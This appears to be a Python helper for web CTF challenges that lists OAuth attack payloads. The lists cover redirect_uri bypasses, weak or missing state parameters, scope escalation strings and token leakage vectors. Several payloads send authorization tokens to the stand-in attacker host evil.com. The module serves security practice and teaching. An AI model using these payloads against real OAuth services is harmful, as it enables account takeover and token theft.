"""
OAuth Misconfiguration Payload Crafter for Web CTF.
Covers redirect_uri bypass, state parameter issues, scope escalation,
and token leakage via referer / open redirect.
"""

from typing import List, Dict


def get_oauth_redirect_uri_bypasses() -> List[Dict[str, str]]:
    """Generate OAuth redirect_uri bypass payloads."""
    return [
        {
            "name": "Open Redirect in redirect_uri",
            "payload": "https://trusted.com/oauth/callback?redirect=https://evil.com",
            "desc": "Chains open redirect to bypass redirect_uri validation."
        },
        {
            "name": "Subdomain Bypass",
            "payload": "https://evil.com.trusted.com/oauth/callback",
            "desc": "Attacker-controlled subdomain of trusted domain."
        },
        {
            "name": "Suffix Bypass",
            "payload": "https://trusted.com.evil.com/oauth/callback",
            "desc": "Trusted domain as subdomain of attacker domain."
        },
        {
            "name": "Path Traversal in redirect_uri",
            "payload": "https://trusted.com/oauth/callback/../evil.com",
            "desc": "Path traversal to bypass redirect_uri validation."
        },
        {
            "name": "Encoded redirect_uri",
            "payload": "https://trusted.com/oauth/callback%2f%2fevil.com",
            "desc": "URL-encoded slashes to bypass validation."
        },
        {
            "name": "Null Byte in redirect_uri",
            "payload": "https://trusted.com/oauth/callback%00.evil.com",
            "desc": "Null byte truncation (legacy)."
        },
        {
            "name": "Fragment in redirect_uri",
            "payload": "https://trusted.com/oauth/callback#@evil.com",
            "desc": "Fragment confusion to bypass validation."
        },
        {
            "name": "Query String in redirect_uri",
            "payload": "https://trusted.com/oauth/callback?redirect=https://evil.com",
            "desc": "Query string confusion to bypass validation."
        },
        {
            "name": "Whitelist Bypass via Invalid Scope",
            "payload": "https://trusted.com/oauth/authorize?scope=invalid&redirect_uri=https://evil.com",
            "desc": "Invalid scope may bypass redirect_uri filter."
        }
    ]


def get_oauth_state_issues() -> List[Dict[str, str]]:
    """Generate OAuth state parameter issues."""
    return [
        {
            "name": "Missing State Parameter",
            "payload": "Omit state parameter entirely",
            "desc": "Without state, CSRF on OAuth callback is possible."
        },
        {
            "name": "Empty State Parameter",
            "payload": "state=",
            "desc": "Empty state parameter may not be validated."
        },
        {
            "name": "Predictable State",
            "payload": "state=123456",
            "desc": "Predictable state allows CSRF / login CSRF."
        },
        {
            "name": "State Reuse",
            "payload": "Reuse a valid state from a previous session",
            "desc": "State reuse may allow session fixation."
        }
    ]


def get_oauth_scope_escalation() -> List[Dict[str, str]]:
    """Generate OAuth scope escalation payloads."""
    return [
        {
            "name": "Scope Escalation",
            "payload": "scope=admin read write delete",
            "desc": "Requests elevated scopes beyond what the app needs."
        },
        {
            "name": "Scope Confusion",
            "payload": "scope=read:admin",
            "desc": "Requests admin read scope."
        },
        {
            "name": "Scope Parameter Pollution",
            "payload": "scope=read&scope=admin",
            "desc": "Duplicate scope parameters to confuse validation."
        },
        {
            "name": "Wildcard Scope",
            "payload": "scope=*",
            "desc": "Requests wildcard scope."
        }
    ]


def get_oauth_token_leakage() -> List[Dict[str, str]]:
    """Generate OAuth token leakage vectors."""
    return [
        {
            "name": "Token in URL (Referer Leak)",
            "payload": "Access token in URL query string leaks via Referer header",
            "desc": "If token is in URL, it leaks to third parties via Referer."
        },
        {
            "name": "Token via Open Redirect",
            "payload": "redirect_uri=https://evil.com (token sent to attacker)",
            "desc": "Open redirect in redirect_uri sends token to attacker."
        },
        {
            "name": "Token in Fragment",
            "payload": "Access token in URL fragment (may leak via history)",
            "desc": "Fragment tokens may leak via browser history or extensions."
        },
        {
            "name": "Token via Log",
            "payload": "Access token logged by server",
            "desc": "Tokens in URLs may be logged by servers."
        }
    ]
